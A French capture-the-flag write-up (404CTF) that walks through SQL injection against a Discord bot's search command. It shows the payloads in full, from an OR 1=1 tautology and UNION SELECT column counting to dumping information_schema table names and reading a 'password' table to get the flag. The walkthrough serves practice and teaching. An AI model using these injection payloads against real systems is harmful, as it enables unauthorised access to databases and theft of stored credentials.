## Un Utilisateur suspicieux (1/2)

### Description

On intéragit avec un bot discord où les commandes disponibles sont :
```
Commandes disponibles :
!chercher argument -> rechercher argument dans la base de données
!authentification motdepasse -> authentifiez vous pour accéder au mode privilégié
!drapeau -> obtenez un mystérieux drapeau
```
L'objectif est donc certainement de ``!chercher`` le bon argument.
On remarque rapidement que ``!chercher "`` ne renvoie rien et que ``!chercher -1" OR 1=1#`` renvoie un grand nombre de résultats.
On vient donc de trouver une injection SQL, à partir de là on peut dérouler le tapis !

### Exploit

#### Trouver le nombre d'arguments

```
!chercher -1" UNION SELECT NULL#
> Results:
  Result #1:
  >None
```

```
!chercher -1" UNION SELECT NULL,NULL#
> Pas de réponse
```

La requête SQL prend donc un seul argument.

#### Trouver le nom des tables de la base de données

```
!chercher -1" UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables#
> Results:
  Result #1:
  >ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEYWORDS,KEY_CACHES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SQL_FUNCTIONS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_FT_CONFIG,GEOMETRY_COLUMNS,INNODB_SYS_TABLESTATS,SPATIAL_REF_SYS,USER_STATISTICS,INNODB_TRX,INNODB_CMP_PER_INDEX,INNODB_METRICS,INNODB_FT_DELETED,INNODB_CMP,THREAD_POOL_WAITS,INNODB_CMP_RESET,THREAD_POOL_QUEUES,TABLE_STATISTICS,INNODB_SYS_FIELDS,INNODB_BUFFER_PAGE_LRU,INNODB_LOCKS,INNODB_FT_INDEX_TABLE,INNODB_CMPMEM,THREAD_POOL_GROUPS,INNODB_CMP_PER_INDEX_RESET,INNODB_SYS_FOREIGN_COLS,INNODB_FT_INDEX_CACHE,INNODB_BUFFER_POOL_STATS,INNODB_FT_BEING_DELETED,INNODB_SYS_FOREIGN,INNODB_CMPMEM_RESET,INNODB_FT_DEFAULT_STOPWORD,INNODB_SYS_TABLES,INNODB_SYS_COLUMNS,INNODB_SYS_TABLESPACES,INNODB_SYS_INDEXES,INNODB_BUFFER_PAGE,INNODB_SYS_VIRTUAL,user_variables,INNODB_TABLESPACES_ENCRYPTION,INNODB_LOCK_WAITS,THREAD_POOL_STATS,Privileged_users,data,password
```

#### Récupérer le flag

```
!chercher -1" UNION SELECT * from password#
> Results:
  Result #1:
  >404CTF{D1sc0rd_&_injection_SQL}
```